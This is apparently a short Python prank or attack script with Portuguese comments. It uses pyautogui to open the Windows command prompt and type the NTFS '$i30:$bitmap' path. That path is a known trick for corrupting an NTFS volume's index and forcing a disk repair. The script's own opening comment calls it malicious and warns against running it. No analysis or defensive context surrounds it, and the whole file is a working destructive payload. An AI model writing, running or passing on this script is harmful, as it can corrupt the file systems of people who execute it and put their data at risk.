# windows
# atenção esse comando e malicioso entao nao execute de estiver em windows.
import pyautogui
import time

pyautogui.hotkey('win', 'r')
pyautogui.write('CMD')

pyautogui.press('enter')
time.sleep(1)

pyautogui.write('color a')
time.sleep(1)
# aqui é onde tudo acontece.
pyautogui.write('C:\:$i30:$bitmap')

pyautogui.press('enter')
